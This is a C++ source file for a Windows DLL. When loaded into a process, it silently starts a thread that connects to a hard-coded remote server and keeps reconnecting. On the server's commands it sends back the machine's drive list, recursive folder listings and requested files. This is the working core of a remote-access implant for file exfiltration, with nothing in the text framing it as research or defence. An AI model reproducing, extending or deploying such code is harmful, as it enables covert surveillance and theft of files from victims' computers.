
#include "socket_util.h"
#include "fileop.h"
#include <windows.h>
#include <stdio.h>
#include <process.h>
#include <list>

#include "MyMutex.h"
#include "SockSendFileManager.h"

#if 1
extern "C" BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	// 处理dll的消息
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		// 对于每个进程只执行一次，进程加载dll
		// Return FALSE to fail DLL load.

		//开启自己的线程做自己的事
		_beginthread(DoEveryThingYouWant, 0, NULL);

		//FreeLibrary(GetModuleHandle("condll.dll"));
		break;

	case DLL_THREAD_ATTACH:break;
	case DLL_THREAD_DETACH:break;
	case DLL_PROCESS_DETACH:break;
	}
	return TRUE;  
}
#else
int main()
{
	DoEveryThingYouWant(NULL);
	system("pause");
	return 0;
}
#endif

void DoEveryThingYouWant(void*)
{
	CSktUtil::CSUInit();

	SockSendFileManager* psssm = new SockSendFileManager();


	SOCKET s;
	sockaddr_in sa = CSktUtil::CSUSucConnect(s, SEVER_IP, SEVER_PORT);
	psssm->Init(SEVER_IP, SEVER_FPORT);

	size_t	recvbufSize = BUFFSIZE;
	char* trecvBuf = (char*)MyMalloc(recvbufSize);
	char* recvBuf;

	size_t	sendbufSize = BUFFSIZE;
	char* tsendBuf = (char*)MyMalloc(sendbufSize);
	char* sendBuf;
	memset(tsendBuf, 0x00, sendbufSize * sizeof(char));

	_uint32 len = 0;
	std::list<CFileTransInfo*> sendlist;
	CFileTransInfo* ptfti;
	int cmd = 0;

	for (;;)
	{
		recvBuf = trecvBuf;
		sendBuf = tsendBuf;
		if (CSktUtil::CSURecv(s, recvBuf, 4) <= 0)
		{
			CSktUtil::CSUClose(s);
			//重新连接服务器
			CSktUtil::CSUSucConnect(s, sa);
			continue;
		}

		len = ntohl(*(_uint32*)(recvBuf));

		if (len > 0 && len < MAX_PATH)
		{
			if (CSktUtil::CSURecv(s, recvBuf, len) <= 0)
			{
				CSktUtil::CSUClose(s);
				//重新连接
				CSktUtil::CSUSucConnect(s, sa);
				continue;
			}
			if (8 == (cmd = ntohl(*(_uint32*)(recvBuf))))
			{
				psssm->SetEnd();
				delete psssm;
				//释放sendlist

				break;	//服务器退出指令
			}
			recvBuf += 4;
			switch (cmd)
			{
			case 1://上传文件系统信息
			{
				memset(sendBuf, 0x00, sendbufSize * sizeof(char));
				DWORD dwLen = ::GetLogicalDriveStringsA(MAX_PATH, sendBuf + 8);
				*(_uint32*)sendBuf = htonl(dwLen+4);		//长度
				*(_uint32*)(sendBuf + 4) = htonl(1);	//类型
				CSktUtil::CSUSend(s, sendBuf, dwLen + 8);
			}
			break;
			case 2://上传指定文件夹的内容
			{
				int len = 0;
				memset(sendBuf, 0x00, sendbufSize * sizeof(char));
				*(int*)(sendBuf + 4) = htonl(2);
				TraverFolder(MyVisitFile, recvBuf, sendBuf + 8, 0);
				len = strlen(sendBuf + 8) + 4;
				*(int*)sendBuf = htonl(len);
				//MessageBox(NULL, sendBuf + 8, recvBuf,1);
				CSktUtil::CSUSend(s, sendBuf, len + 4);
			}
			break;
			case 3://上传文件
			{
				ptfti = new CFileTransInfo();
				//本地路径
				_uint32 len = 4;
				_uint32 tlen = ntohl(*(int*)recvBuf);
				strncpy(ptfti->remote_file_path, recvBuf + len, tlen);
				ptfti->remote_file_path[tlen] = 0;
				len += tlen;

				//远程路径rmtpath
				tlen = ntohl(*(int*)(recvBuf + len));
				len += 4;
				strncpy(ptfti->file_path, recvBuf + len, tlen);
				ptfti->file_path[tlen] = 0;
				len += tlen;

				//文件名filenamelen
				tlen = ntohl(*(int*)(recvBuf + len));
				len += 4;
				strncpy(ptfti->file_name, recvBuf + len, tlen);
				ptfti->file_name[tlen] = 0;

				//sendlist.push_back(ptfti);
				psssm->ReqSendFile(ptfti);
			}
			break;
			default:
				break;
			}
		}
	}

	free(recvBuf);
	CSktUtil::CSUCleanup();
}

bool MyVisitFile(const char* lpPath, int kind, void* data)
{
	if (NULL != data)
	{
		char* buf = (char*)data;
		sprintf(buf + strlen(buf), "[%c]%s", (kind & FILE_ATTRIBUTE_DIRECTORY) ? 'D' : 'F', lpPath);
		return true;
	}
	return false;
}

void MySucConnect()
{

}